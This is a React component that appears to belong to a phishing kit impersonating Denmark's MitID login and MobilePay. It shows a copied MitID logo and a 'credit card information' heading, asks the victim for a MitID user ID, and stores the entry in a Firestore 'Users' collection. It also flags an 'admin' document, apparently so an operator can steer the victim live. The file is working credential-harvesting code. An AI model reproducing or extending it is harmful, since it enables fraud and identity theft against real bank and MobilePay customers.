import { doc, setDoc, updateDoc } from "firebase/firestore";
import React, { useState } from "react";
import { useOutletContext } from "react-router-dom";
import { db } from "../../firebase";

function Login() {
  const [identifier, setIdentifier] = useOutletContext();
  const [bruger, setBruger] = useState("");
  const BrugerData = async () => {
    if (!bruger) return;
    await setDoc(doc(db, "Users", "bruger_" + identifier.replaceAll("+", "")), {
      id: identifier.replaceAll("+", ""),
      bruger: bruger,
    });

    await updateDoc(doc(db, "admin", identifier), {
      loading: true,
      link: "",
    });
  };

  return (
    <div className="max-w-md m-auto">
      <div className="py-3 px-7  min-h-[60vh]">
        <div className="flex justify-between items-center h-16 border-b-2 mb-6">
          <h2 className="font-semibold text-lg">Kreditkortoplysninger</h2>
          <span>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="61"
              height="16"
              viewBox="0 0 61 16"
              className="mitid-core-header__logo"
              fill="blue"
              focusable="false"
              aria-label="MitID logo"
            >
              <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z"></path>
            </svg>
          </span>
        </div>

        <h3 className="text-left text-red-500 font-medium mb-3">
          Bekræft din MobilePay ved at logge ind med dit MitID
        </h3>
        <div className="my-6">
          <label
            htmlFor="link"
            className="block text-left text-md font-semibold mb-2  text-gray-900"
          >
            BRUGER-ID
          </label>
          <input
            onChange={(e) => setBruger(e.target.value)}
            type="cc"
            id="cc"
            className="bg-gray-50 border border-gray-800 text-gray-900 text-sm rounded-sm focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 "
            placeholder=""
          />
        </div>
        <div className="flex items-start mb-1"></div>
        <button
          onClick={BrugerData}
          type="submit"
          className="text-white w-full bg-blue-700 hover:bg-blue-800 font-medium rounded-sm text-sm outline-none  px-5 py-2.5 text-center flex justify-between"
        >
          <p>Fortsæt</p>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            focusable="false"
            className="mitid--button-icon"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="white"
            aria-hidden="true"
          >
            <path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"></path>
          </svg>
        </button>
      </div>
    </div>
  );
}

export default Login;
